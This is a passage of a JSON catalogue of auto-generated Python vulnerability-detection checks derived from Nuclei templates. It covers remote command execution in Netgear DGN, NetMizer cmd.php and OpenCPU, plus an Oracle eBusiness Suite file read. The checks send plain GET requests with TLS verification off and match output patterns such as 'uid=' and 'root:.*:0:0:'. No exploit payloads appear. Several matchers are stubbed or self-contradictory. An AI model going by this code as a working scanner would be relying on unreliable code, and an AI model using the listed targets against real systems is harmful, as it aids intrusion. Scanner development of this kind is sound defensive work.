        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: netgear-dgn-rce\nName: Netgear DGN Devices - Command Execution\nSeverity: critical\nDescription: This template checks for unauthenticated command execution vulnerability in Netgear DGN devices. Attackers can bypass authentication mechanisms and execute arbitrary commands with root privileges.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_netgear_dgn_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"netgear-dgn-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Netgear DGN Devices - Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: contains(body, '{{randstr}}'); !contains(body, 'echo {{randstr}}')\"\n\n        # Simple word matcher simulation\n        matchers = ['{{randstr}}', 'echo {{randstr}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Netgear DGN Devices - Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_netgear_dgn_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "rce",
          "netgear",
          "dgn",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_netmizer_cmd_rce",
        "name": "NetMizer LogManagement System cmd.php - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Remote Command Execution vulnerability in the NetMizer log management system cmd.php, and the attacker can execute the command by passing in the cmd parameter.",
        "severity": "critical",
        "detection": "[AND] regex ['uid=(\\\\d+)\\\\(.*?\\\\) gid=(\\\\d+)\\\\(.*?\\\\) groups=([\\\\d,]+)\\\\(.*?\\\\)'] | mot(s) 'text/html' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: netmizer-cmd-rce\nName: NetMizer LogManagement System cmd.php - Remote Code Execution\nSeverity: critical\nDescription: Remote Command Execution vulnerability in the NetMizer log management system cmd.php, and the attacker can execute the command by passing in the cmd parameter.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_netmizer_cmd_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"netmizer-cmd-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"NetMizer LogManagement System cmd.php - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['uid=(\\\\\\\\d+)\\\\\\\\(.*?\\\\\\\\) gid=(\\\\\\\\d+)\\\\\\\\(.*?\\\\\\\\) groups=([\\\\\\\\d,]+)\\\\\\\\(.*?\\\\\\\\)'] | mot(s) 'text/html' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['uid=(\\\\\\\\d+)\\\\\\\\(.*?\\\\\\\\) gid=(\\\\\\\\d+)\\\\\\\\(.*?\\\\\\\\) groups=([\\\\\\\\d,]+)\\\\\\\\(.*?\\\\\\\\)', 'text/html']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"NetMizer LogManagement System cmd.php - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_netmizer_cmd_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: netmizer-cmd-rce\nName: NetMizer LogManagement System cmd.php - Remote Code Execution\nSeverity: critical\nDescription: Remote Command Execution vulnerability in the NetMizer log management system cmd.php, and the attacker can execute the command by passing in the cmd parameter.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_netmizer_cmd_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"netmizer-cmd-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"NetMizer LogManagement System cmd.php - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['uid=(\\\\\\\\d+)\\\\\\\\(.*?\\\\\\\\) gid=(\\\\\\\\d+)\\\\\\\\(.*?\\\\\\\\) groups=([\\\\\\\\d,]+)\\\\\\\\(.*?\\\\\\\\)'] | mot(s) 'text/html' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['uid=(\\\\\\\\d+)\\\\\\\\(.*?\\\\\\\\) gid=(\\\\\\\\d+)\\\\\\\\(.*?\\\\\\\\) groups=([\\\\\\\\d,]+)\\\\\\\\(.*?\\\\\\\\)', 'text/html']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"NetMizer LogManagement System cmd.php - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_netmizer_cmd_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "netmizer",
          "cmd",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_opencpu_rce",
        "name": "OpenCPU - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Check for remote code execution via OpenCPU was conducted.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'uid=, gid=' | status HTTP [201]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: opencpu-rce\nName: OpenCPU - Remote Code Execution\nSeverity: critical\nDescription: Check for remote code execution via OpenCPU was conducted.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_opencpu_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"opencpu-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"OpenCPU - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'uid=, gid=' | status HTTP [201]\"\n\n        # Simple word matcher simulation\n        matchers = ['uid=, gid=']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"OpenCPU - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_opencpu_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: opencpu-rce\nName: OpenCPU - Remote Code Execution\nSeverity: critical\nDescription: Check for remote code execution via OpenCPU was conducted.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_opencpu_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"opencpu-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"OpenCPU - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'uid=, gid=' | status HTTP [201]\"\n\n        # Simple word matcher simulation\n        matchers = ['uid=, gid=']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"OpenCPU - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_opencpu_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "rce",
          "opencpu",
          "oss",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_oracle_ebs_bispgrapgh_file_read",
        "name": "Oracle eBusiness Suite - Improper File Access",
        "language": "Python",
        "famille": "WebApp",
        "description": "Oracle eBusiness Suite is susceptible to improper file access vulnerabilities via bispgrapgh. Be aware this product is no longer supported with patches or security fixes.",
        "severity": "critical",
        "detection": "[OR] regex ['root:.*:0:0:']",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
